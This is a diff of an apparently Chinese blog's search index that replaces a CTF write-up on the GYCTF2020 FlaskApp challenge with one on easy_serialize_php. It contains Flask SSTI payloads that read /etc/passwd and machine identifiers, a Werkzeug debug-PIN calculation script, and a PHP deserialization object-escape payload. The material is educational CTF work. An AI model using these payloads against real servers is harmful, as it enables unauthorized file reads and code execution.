-<p><strong>payload:_SESSION[user]&#x3D;flagflagflagflagflagphp&amp;_SESSION[function]&#x3D;”;s:3:”img”;s:20:”ZDBnM19mMWFnLnBocA&#x3D;&#x3D;”;s:1:”1”;s:1:”2”;}</strong></p>
+<p>参考：<a href="https://mayi077.gitee.io/2020/04/17/GYCTF2020-FlaskApp/">https://mayi077.gitee.io/2020/04/17/GYCTF2020-FlaskApp/</a></p>
 ]]></content>
       <categories>
         <category>Web</category>
@@ -243,61 +289,61 @@
       </tags>
   </entry>
   <entry>
-    <title>BUU-[GYCTF2020]FlaskApp的Wp</title>
-    <url>/CTF/Web/BUU-%5BGYCTF2020%5DFlaskApp/</url>
-    <content><![CDATA[<h2 id="GYCTF2020-FlaskApp的Wp"><a href="#GYCTF2020-FlaskApp的Wp" class="headerlink" title="[GYCTF2020]FlaskApp的Wp"></a>[GYCTF2020]FlaskApp的Wp</h2><p><strong>计算PIN码的方法（必须知道的值）：</strong></p>
-<blockquote>
-<ol>
-<li>username：就是启动这个flask的用户</li>
-</ol>
-<p>-&gt; <code>etc/passwd</code> 中查看</p>
-<ol start="2">
-<li><p>modname：一般为flask.py</p>
-</li>
-<li><p>getattr(app, “__name__”, app.<strong>class</strong>.<strong>name</strong>)：python该值一般为Flask 值一般不变</p>
-</li>
-<li><p>getattr(mod, ‘file’, None)：为flask目录下的一个app.py的绝对路径（通过报错信息一般回泄露该路径）</p>
-</li>
-<li><p>uuid.getnode()：就是当前电脑的MAC地址，str(uuid.getnode())则是mac地址的十进制表达式</p>
-</li>
-</ol>
-<p>-&gt; 通过文件 <code>/sys/class/net/eth0/address</code>获取     # eth0 处为当前使用的网卡</p>
-<ol start="6">
-<li>get_machine_id() ：&#x2F;etc&#x2F;machine-id或者 &#x2F;proc&#x2F;sys&#x2F;kernel&#x2F;random&#x2F;boot_i中的值</li>
-</ol>
-<p>-&gt;假如是在win平台下读取不到上面两个文件，就去获取注册表中SOFTWARE\Microsoft\Cryptography的值</p>
-<p>-&gt;假如是Docker机 那么为 &#x2F;proc&#x2F;self&#x2F;cgroup</p>
+    <title>BUU-easy_serialize_php的Wp</title>
+    <url>/CTF/Web/BUU-easy_serialize_php/</url>
+    <content><![CDATA[<blockquote>
+<p>1.代码审计</p>
+<p>2.PHP反序列化</p>
+<p>3.反序列化中的对象逃逸</p>
 </blockquote>
-<p>python shell的一些命令(os 模块)</p>
-<p>import os</p>
-<p>查看当前目录所有文件 <code>os.listdir(&#39;.&#39;)</code></p>
-<p>查看当前目录<code>os.getcwd()</code></p>
-<p>更改目录<code>os.chdir()</code></p>
-<p>打开文件<code>os.popen(&#39;cat filepath&#39;).read()</code></p>
-<p>打开文件<code>exec(open(&#39;filepath&#39;).read())</code> 好像会报错，但是报错中有文件内容</p>
-<p><strong>解题：</strong></p>
-<p>题目是FlaskAPP，打开网址，有提示.</p>
-<p><img src="/CTF/Web/BUU-%5BGYCTF2020%5DFlaskApp/03.png"></p>
-<p>获取到的信息：Flask 和 PIN（根据要获得PIN的需要知道的数值） -&gt; 读取文件 -&gt;SSTI（Flask）注入读取文件</p>
-<p><strong>SSTI</strong> 要寻找注入点-&gt; 先经过base64加密之后 再进行base64解码 （注入点在base64解码那里）</p>
-<p><img src="/CTF/Web/BUU-%5BGYCTF2020%5DFlaskApp/04.png"></p>
-<p><strong>Payload：</strong></p>
-<p><strong>1.获取username</strong></p>
-<p><code>&#123;&#123;&#123;&#125;.__class__.__mro__[-1].__subclasses__()[102].__init__.__globals__['open']('/etc/passwd').read()&#125;&#125;</code></p>
-<p><img src="/CTF/Web/BUU-%5BGYCTF2020%5DFlaskApp/00.png"></p>
-<p><img src="/CTF/Web/BUU-%5BGYCTF2020%5DFlaskApp/01.png"></p>
-<p>2.获取Mac地址（同上, 转成十进制）</p>
-<p><code>&#123;&#123;&#123;&#125;.__class__.__mro__[-1].__subclasses__()[102].__init__.__globals__['open']('/sys/class/net/eth0/address').read()&#125;&#125;</code></p>
-<p><img src="/CTF/Web/BUU-%5BGYCTF2020%5DFlaskApp/02.png"></p>
-<p><strong>3.获取机器ID（不止这第一个路径，还有几个其他的，都要试试，我的是这个得到了正确答案）</strong></p>
-<p><code>&#123;&#123;&#123;&#125;.__class__.__mro__[-1].__subclasses__()[102].__init__.__globals__['open']('/etc/machine-id').read()&#125;&#125;</code></p>
-<p><strong>获取PIN的脚本（网上找的）</strong></p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> itertools <span class="keyword">import</span> chain</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line">probably_public_bits = [</span><br><span class="line">    <span class="string">&#x27;flaskweb&#x27;</span>,<span class="comment"># username</span></span><br><span class="line">    <span class="string">&#x27;flask.app&#x27;</span>,<span class="comment"># modname</span></span><br><span class="line">    <span class="string">&#x27;Flask&#x27;</span>,<span class="comment"># getattr(app, &#x27;__name__&#x27;, getattr(app.__class__, &#x27;__name__&#x27;))</span></span><br><span class="line">    <span class="string">&#x27;/usr/local/lib/python3.7/site-packages/flask/app.py&#x27;</span> <span class="comment"># getattr(mod, &#x27;__file__&#x27;, None),</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">private_bits = [</span><br><span class="line">    <span class="string">&#x27;11296411583006&#x27;</span><span class="comment"># str(uuid.getnode()),  /sys/class/net/eth0/address</span></span><br><span class="line">    <span class="string">&#x27;1408f836b0ca514d796cbf8960e45fa1&#x27;</span>, <span class="comment"># get_machine_id(),/etc/machine-id</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">h = hashlib.md5()</span><br><span class="line"><span class="keyword">for</span> bit <span class="keyword">in</span> chain(probably_public_bits, private_bits):</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> bit:</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">isinstance</span>(bit, <span class="built_in">str</span>):</span><br><span class="line">        bit = bit.encode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">    h.update(bit)</span><br><span class="line">h.update(<span class="string">b&#x27;cookiesalt&#x27;</span>)</span><br><span class="line"></span><br><span class="line">cookie_name = <span class="string">&#x27;__wzd&#x27;</span> + h.hexdigest()[:<span class="number">20</span>]</span><br><span class="line"></span><br><span class="line">num = <span class="literal">None</span></span><br><span class="line"><span class="keyword">if</span> num <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">    h.update(<span class="string">b&#x27;pinsalt&#x27;</span>)</span><br><span class="line">    num = (<span class="string">&#x27;%09d&#x27;</span> % <span class="built_in">int</span>(h.hexdigest(), <span class="number">16</span>))[:<span class="number">9</span>]</span><br><span class="line"></span><br><span class="line">rv =<span class="literal">None</span></span><br><span class="line"><span class="keyword">if</span> rv <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">    <span class="keyword">for</span> group_size <span class="keyword">in</span> <span class="number">5</span>, <span class="number">4</span>, <span class="number">3</span>:</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(num) % group_size == <span class="number">0</span>:</span><br><span class="line">            rv = <span class="string">&#x27;-&#x27;</span>.join(num[x:x + group_size].rjust(group_size, <span class="string">&#x27;0&#x27;</span>)</span><br><span class="line">                          <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(num), group_size))</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        rv = num</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(rv)</span><br></pre></td></tr></table></figure>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$function</span> = @<span class="variable">$_GET</span>[<span class="string">&#x27;f&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$function</span> == <span class="string">&#x27;highlight_file&#x27;</span>)&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="string">&#x27;index.php&#x27;</span>);</span><br><span class="line">&#125;<span class="keyword">else</span> <span class="keyword">if</span>(<span class="variable">$function</span> == <span class="string">&#x27;phpinfo&#x27;</span>)&#123;</span><br><span class="line">    <span class="keyword">eval</span>(<span class="string">&#x27;phpinfo();&#x27;</span>); <span class="comment">//maybe you can find something in here!</span></span><br><span class="line">&#125;<span class="keyword">else</span> <span class="keyword">if</span>(<span class="variable">$function</span> == <span class="string">&#x27;show_image&#x27;</span>)&#123;</span><br><span class="line">    <span class="variable">$userinfo</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$serialize_info</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="title function_ invoke__">base64_decode</span>(<span class="variable">$userinfo</span>[<span class="string">&#x27;img&#x27;</span>]));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
+<blockquote>
+<p>$function 变量 通过GET传f变量得到   &#x3D;&gt; 不同的值，对应不同的页面</p>
+<p> -&gt; 当f传入phpinfo , 可以得到提示 &#x3D;&gt; 一个文件的名字 d0g3_f1ag.php</p>
+<p> -&gt;当f传入show_image的时候存在file_get_contents函数 &#x3D;&gt; 可以读取文件内容</p>
+</blockquote>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params"><span class="variable">$img</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$filter_arr</span> = <span class="keyword">array</span>(<span class="string">&#x27;php&#x27;</span>,<span class="string">&#x27;flag&#x27;</span>,<span class="string">&#x27;php5&#x27;</span>,<span class="string">&#x27;php4&#x27;</span>,<span class="string">&#x27;fl1g&#x27;</span>);</span><br><span class="line">    <span class="variable">$filter</span> = <span class="string">&#x27;/&#x27;</span>.<span class="title function_ invoke__">implode</span>(<span class="string">&#x27;|&#x27;</span>,<span class="variable">$filter_arr</span>).<span class="string">&#x27;/i&#x27;</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">preg_replace</span>(<span class="variable">$filter</span>,<span class="string">&#x27;&#x27;</span>,<span class="variable">$img</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
+<blockquote>
+<p>filter函数 &#x3D;&gt;过滤函数, 将一系列黑名单替换为空 &#x3D;&gt; 将$img变量中存在黑名单的内容替换为空</p>
+</blockquote>
+<p>-&gt; 以及serialize和unserialize两个序列化函数，想到键值对的逃逸</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">extract</span>(<span class="variable">$_POST</span>);</span><br><span class="line"><span class="comment">// 以POST方法传入参数 =&gt; extract函数的作用是将post方法传入的键值对，以变量的形式返回</span></span><br><span class="line"><span class="variable">$serialize_info</span> = <span class="title function_ invoke__">filter</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$_SESSION</span>));</span><br><span class="line"><span class="comment">// 将$_SESSION序列化后进行filter进行过滤，然后赋值给 $serialize_info变量</span></span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span>(<span class="variable">$function</span> == <span class="string">&#x27;show_image&#x27;</span>)&#123;</span><br><span class="line">    <span class="variable">$userinfo</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$serialize_info</span>); <span class="comment">// 将$serialize_info变量进行反序列化</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="title function_ invoke__">base64_decode</span>(<span class="variable">$userinfo</span>[<span class="string">&#x27;img&#x27;</span>]));</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 将$userinfo变量数组中img的值进行base64解码后进行文件的读取</span></span><br></pre></td></tr></table></figure>
 
+<p><img src="/CTF/Web/BUU-easy_serialize_php/test00.png"></p>
 <hr>
-<p>参考：<a href="https://mayi077.gitee.io/2020/04/17/GYCTF2020-FlaskApp/">https://mayi077.gitee.io/2020/04/17/GYCTF2020-FlaskApp/</a></p>
+<p><strong>如何去构造一个字符串逃逸</strong></p>
+<hr>
+<p><strong>1.键名逃逸</strong></p>
+<p>如何传入$_SESSION[phpflag] 序列化之后</p>
+<p>-&gt; s:7:”phpflag”:s:48:”” &#x3D;&gt; s:7:”<code>&quot;:s:48:&quot;</code>;”</p>
+<p>-&gt; 48是 传入phpflag的值的长度（即, $img对应的值）</p>
+<p>-&gt; 最后要进行序列化的闭合 <code>;&#125;</code></p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;img&#x27;</span>] = <span class="string">&quot;ZDBnM19mMWFnLnBocA==&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$_SESSION</span>);</span><br><span class="line"><span class="comment">// s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA==&quot;;&#125;</span></span><br></pre></td></tr></table></figure>
+
+<p>结合起来</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;phpflag&#x27;</span>]=<span class="string">&quot;;s:1:\&quot;1\&quot;;s:3:\&quot;img\&quot;;s:20:\&quot;ZDBnM19mMWFnLnBocA==\&quot;;&#125;&quot;</span>;</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;img&#x27;</span>] = <span class="title function_ invoke__">base64_encode</span>(<span class="string">&#x27;guest_img.png&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>( <span class="title function_ invoke__">serialize</span>(<span class="variable">$_SESSION</span>) );</span><br><span class="line"><span class="comment">// &quot;a:2:&#123;s:7:&quot;phpflag&quot;;s:48:&quot;;s:1:&quot;1&quot;;s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA==&quot;;&#125;&quot;;s:3:&quot;img&quot;;s:20:&quot;Z3Vlc3RfaW1nLnBuZw==&quot;;&#125;&quot;</span></span><br><span class="line"><span class="comment">// &quot;a:2:&#123;s:7:&quot;&quot;;s:48:&quot;;s:1:&quot;1&quot;;s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA==&quot;;&#125;&quot;;s:3:&quot;img&quot;;s:20:&quot;Z3Vlc3RfaW1nLnBuZw==&quot;;&#125;&quot;</span></span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>逃逸成了 </p>
+<p>“;s:48: 的变量名对应的值为1 </p>
+<p>​	-&gt; 注意的点<code>&quot;;s:</code>肯定有，48:是后面的值的长度</p>
+<p>​	-&gt; 第二个”是传入的值的前引号</p>
+<p>​	-&gt;我们需要自己构造的是闭合这个名字 <code>;</code></p>
+<p>img的变量名对应的值对 base64_encode(d0g3_f1ag.php)</p>
+<p>​	-&gt; 注意的点，闭合这个序列化 ;}</p>
+</blockquote>
+<p><strong>2.键值逃逸</strong></p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;user&#x27;</span>] = <span class="string">&quot;flagflagflagflagflagphp&quot;</span>;</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;function&#x27;</span>] = <span class="string">&quot;;s:3:\&quot;img\&quot;;s:20:\&quot;ZDBnM19mMWFnLnBocA==\&quot;;&#125;&quot;</span>;</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>( <span class="title function_ invoke__">serialize</span>(<span class="variable">$_SESSION</span>) );</span><br><span class="line"><span class="comment">// &quot;a:2:&#123;s:4:&quot;user&quot;;s:23:&quot;flagflagflagflagflagphp&quot;;s:8:&quot;function&quot;;s:40:&quot;;s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA==&quot;;&#125;&quot;;&#125;&quot;</span></span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>先将自己要写入的代码放进去 也就是$function的值</p>
+<p>-&gt;通过测试，一步步调整 user中的值 来闭合</p>
+</blockquote>
+<p><code>&quot;a:2:&#123;s:4:&quot;user&quot;;s:23:&quot;flagflagflagflagflagphp&quot;;s:8:&quot;function&quot;;s:40:&quot;;s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA==&quot;;&#125;&quot;;&#125;&quot;</code></p>
+<p><code>&quot;;s:8:&quot;function&quot;;s:40:&quot;</code> -&gt;这是23的长度，我们传入function中的值，开始要有一个”和; 来闭合前面user的值</p>
+<p><strong>payload:_SESSION[user]&#x3D;flagflagflagflagflagphp&amp;_SESSION[function]&#x3D;”;s:3:”img”;s:20:”ZDBnM19mMWFnLnBocA&#x3D;&#x3D;”;s:1:”1”;s:1:”2”;}</strong></p>
 ]]></content>
       <categories>
         <category>Web</category>
